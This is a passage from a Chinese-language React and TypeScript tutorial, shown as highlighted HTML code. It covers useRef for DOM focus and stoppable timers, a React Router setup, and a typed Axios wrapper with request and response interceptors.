class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FocusInput</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>注意与 TypeScript 结合使用时的方式，需要先声明好泛型</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> inputRef = useRef&lt;<span class="hljs-title class_">HTMLInputElement</span>&gt;(<span class="hljs-literal">null</span>)<br>复制代码<br></code></pre></td></tr></table></figure><p>同时使用时需要判空</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx">inputRef.<span class="hljs-property">current</span> &amp;&amp; inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>()<br>复制代码<br></code></pre></td></tr></table></figure><p><code>useRef</code> 返回一个可变的 ref 对象，其 <code>.current</code> 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。</p><p>Refs 提供了一种方式，允许我们访问 DOM 节点或在 render 方法中创建的 React 元素。</p><p>在典型的 React 数据流中，props 是父组件与子组件交互的唯一方式。要修改一个子组件，你需要使用新的 props 来重新渲染它。但是，在某些情况下，你需要在典型数据流之外强制修改子组件。被修改的子组件可能是一个 React 组件的实例，也可能是一个 DOM 元素。对于这两种情况，React 都提供了解决办法。</p><p>下面是几个适合使用 refs 的情况</p><ul><li>管理焦点，文本选择或媒体播放。</li><li>触发强制动画。</li><li>集成第三方 DOM 库。</li></ul><p>避免使用 refs 来做任何可以通过声明式实现来完成的事情。举个例子，避免在 Dialog 组件里暴露 open() 和 close() 方法，最好传递 isOpen 属性。</p><p>勿过度使用 Refs</p><p>你可能首先会想到使用 refs 在你的 app 中“让事情发生”。如果是这种情况，请花一点时间，认真再考虑一下 state 属性应该被安排在哪个组件层中。通常你会想明白，让更高的组件层级拥有这个 state，是更恰当的。查看 状态提升 以获取更多有关示例。</p><hr><p>可以停止的计时器示例：</p><p>需求是页面上有一个每隔1秒自动加一的计时器，并且有个按钮，点击后计时器停止，先使用 Class 组件完成这样的需求</p><p>ClassTimer.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; <span class="hljs-title class_">Component</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassTimer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span>&lt;&#123;&#125;, &#123; <span class="hljs-attr">timer</span>: number &#125;&gt; &#123;<br>  interval!: number<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props: Readonly&lt;&#123;&#125;&gt;</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props)<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>      <span class="hljs-attr">timer</span>: <span class="hljs-number">0</span><br>    &#125;<br>  &#125;<br><br>  <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">interval</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prevState</span> =&gt;</span> (&#123;<br>        <span class="hljs-attr">timer</span>: prevState.<span class="hljs-property">timer</span> + <span class="hljs-number">1</span><br>      &#125;))<br>    &#125;, <span class="hljs-number">1000</span>)<br>  &#125;<br><br>  <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">interval</span>)<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        Timer - &#123;this.state.timer&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">            clearInterval(this.interval)</span><br><span class="language-xml">          &#125;&#125;</span><br><span class="language-xml">        &gt;Clear Timer<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>App.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ClassTimer</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/29ClassTimer&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ClassTimer</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>Function 组件示例</p><p>HookTimer.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect, useRef &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">HookTimer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [timer, setTimer] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br><br>  <span class="hljs-comment">//  @ts-ignore</span><br>  <span class="hljs-keyword">const</span> intervalRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>) <span class="hljs-keyword">as</span> &#123; <span class="hljs-attr">current</span>: number &#125;<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    intervalRef.<span class="hljs-property">current</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">setTimer</span>(<span class="hljs-function"><span class="hljs-params">pre</span> =&gt;</span> pre + <span class="hljs-number">1</span>)<br>    &#125;, <span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-built_in">clearInterval</span>(intervalRef.<span class="hljs-property">current</span>)<br>    &#125;<br>  &#125;, [])<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      HookTimer - &#123;timer&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">          clearInterval(intervalRef.current)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      &gt;Clear Hook Timer<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HookTimer</span><br></code></pre></td></tr></table></figure><p>App.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ClassTimer</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/29ClassTimer&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">HookTimer</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/29HookTimer&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ClassTimer</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">HookTimer</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>这就是 useRef 的第二种用法，可以用它创建一个通用的容器，用来保存变量。</p><h3 id="4-React-router"><a href="#4-React-router" class="headerlink" title="4 React router"></a>4 React router</h3><p>举例</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App14&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Home&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">List</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/List&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Detail</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Detail&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Error</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Error&#x27;</span><br><br><span class="hljs-comment">// BrowserRouter（history模式）不带#需要配置，HashRouter（Hash模式）带#打包后即可</span><br><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span>, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span><br><br><span class="hljs-comment">// 定义一个路由</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">BaseRouter</span> = (<span class="hljs-params"></span>) =&gt; (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">App</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/home&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/list/:id&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">List</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/detail&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Detail</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Error</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br>)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">BaseRouter</span>;<br></code></pre></td></tr></table></figure><h3 id="5-axios"><a href="#5-axios" class="headerlink" title="5 axios"></a>5 axios</h3><p>在React项目中，我们经常使用Axios库进行数据请求，Axios 是基于 Promise 的 HTTP 库，可以在浏览器和 node.js 中使用。Axios 具备以下特性：</p><ul><li>从浏览器中创建 XMLHttpRequests；</li><li>从 node.js 创建 HTTP 请求；</li><li>支持 Promise API；</li><li>拦截请求和响应；</li><li>转换请求数据和响应数据；</li><li>取消请求；</li><li>自动转换 JSON 数据；</li><li>客户端支持防御 XSRF。</li></ul><p>Axios的基本使用就不再多介绍了。为了更好地调用，做一些全局的拦截，通常会对Axios进行封装，下面就使用TypeScript对Axios进行简单封装，使其同时能够有很好的类型支持。Axios是自带声明文件的，所以我们无需额外的操作。 </p><p>下面来看基本的封装：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> axios, &#123; <span class="hljs-title class_">AxiosInstance</span>, <span class="hljs-title class_">AxiosRequestConfig</span>, <span class="hljs-title class_">AxiosPromise</span>,<span class="hljs-title class_">AxiosResponse</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>; <span class="hljs-comment">// 引入axios和定义在node_modules/axios/index.ts文件里的类型声明</span><br><br> <span class="hljs-comment">// 定义接口请求类，用于创建axios请求实例</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpRequest</span> &#123;<br>  <span class="hljs-comment">// 接收接口请求的基本路径</span><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> baseUrl: <span class="hljs-built_in">string</span></span>) &#123; <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">baseUrl</span> = baseUrl;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 调用接口时调用实例的这个方法，返回AxiosPromise</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">request</span>(<span class="hljs-attr">options</span>: <span class="hljs-title class_">AxiosRequestConfig</span>): <span class="hljs-title class_">AxiosPromise</span> &#123; <br>    <span class="hljs-comment">// 创建axios实例，它是函数，同时这个函数包含多个属性</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">AxiosInstance</span> = axios.<span class="hljs-title function_">create</span>() <br>    <span class="hljs-comment">// 合并基础路径和每个接口单独传入的配置，比如url、参数等</span><br>    options = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">mergeConfig</span>(options) <br>    <span class="hljs-comment">// 调用interceptors方法使拦截器生效</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">interceptors</span>(instance, options.<span class="hljs-property">url</span>) <br>    <span class="hljs-comment">// 返回AxiosPromise</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">instance</span>(options) <br>  &#125;<br>  <br>  <span class="hljs-comment">// 用于添加全局请求和响应拦截</span><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">interceptors</span>(<span class="hljs-params">instance: AxiosInstance, url?: <span class="hljs-built_in">string</span></span>) &#123; <br>    <span class="hljs-comment">// 请求和响应拦截</span><br>  &#125;<br>  <br>  <span class="hljs-comment">// 用于合并基础路径配置和接口单独配置</span><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">mergeConfig</span>(<span class="hljs-attr">options</span>: <span class="hljs-title class_">AxiosRequestConfig</span>): <span class="hljs-title class_">AxiosRequestConfig</span> &#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123; <span class="hljs-attr">baseURL</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">baseUrl</span> &#125;, options);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HttpRequest</span>;<br></code></pre></td></tr></table></figure><p>通常baseUrl在开发环境的和生产环境的路径是不一样的，所以可以根据当前是开发环境还是生产环境做判断，应用不同的基础路径。这里要写在一个配置文件里：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">api</span>: &#123;<br>        <span class="hljs-attr">devApiBaseUrl</span>: <span class="hljs-string">&#x27;/test/api/xxx&#x27;</span>,<br>        <span class="hljs-attr">proApiBaseUrl</span>: <span class="hljs-string">&#x27;/api/xxx&#x27;</span>,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在上面的文件中引入这个配置：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-attr">api</span>: &#123; devApiBaseUrl, proApiBaseUrl &#125; &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/config&#x27;</span>;<br><span class="hljs-keyword">const</span> apiBaseUrl = env.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span> ? proApiBaseUrl : devApiBaseUrl;<br></code></pre></td></tr></table></figure><p>之后就可以将apiBaseUrl作为默认值传入HttpRequest的参数：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpRequest</span> &#123; <br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> baseUrl: <span class="hljs-built_in">string</span> = apiBaseUrl</span>) &#123; <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">baseUrl</span> = baseUrl;<br>  &#125;<br></code></pre></td></tr></table></figure><p>接下来可以完善一下拦截器类，在类中interceptors方法内添加请求拦截器和响应拦截器，实现对所有接口请求的统一处理：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">private</span> <span class="hljs-title function_">interceptors</span>(<span class="hljs-params">instance: AxiosInstance, url?: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-comment">// 请求拦截</span><br>    instance.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">config: AxiosRequestConfig</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 接口请求的所有配置，可以在axios.defaults修改配置</span><br>      <span class="hljs-keyword">return</span> config<br>    &#125;,<br>    <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)<br>    &#125;)<br> <br>  <span class="hljs-comment">// 响应拦截</span><br>    instance.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">res: AxiosResponse</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> &#123; data &#125; = res <br>      <span class="hljs-keyword">const</span> &#123; code, msg &#125; = data<br>      <span class="hljs-keyword">if</span> (code !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(msg) <br>      &#125;<br>      <span class="hljs-keyword">return</span> res<br>    &#125;,<br>    <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123; <br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)<br>    &#125;)<br>  &#125;<br></code></pre></td></tr></table></figure><p>到这里封装的就差不多了，一般服务端会将状态码、提示信息和数据封装在一起，然后作为数据返回，所以所有请求返回的数据格式都是一样的，所以就可以定义一个接口来指定返回的数据结构，可以定义一个接口：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ResponseData</span> &#123;<br>  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span><br>  data?: <span class="hljs-built_in">any</span><br>  <span class="hljs-attr">msg</span>: <span class="hljs-built_in">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接下来看看使用TypeScript封装的Axios该如何使用。可以先定义一个请求实例：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">HttpRequest</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/utils/axios&#x27;</span><br><span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/utils/axios&#x27;</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpRequest</span>()<br></code></pre></td></tr></table></figure><p>这里把请求类导入进来，默认导出这个类的实例。之后创建一个登陆接口请求方法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> axios, &#123; <span class="hljs-title class_">ResponseData</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./index&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">AxiosPromise</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ILogin</span> &#123;<br>  <span class="hljs-attr">user</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">password</span>: <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> loginReq = (<span class="hljs-attr">data</span>: <span class="hljs-title class_">ILogin</span>): <span class="hljs-title class_">AxiosPromise</span>&lt;<span class="hljs-title class_">ResponseData</span>&gt; =&gt; &#123;<br>  <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/user/login&#x27;</span>,<br>    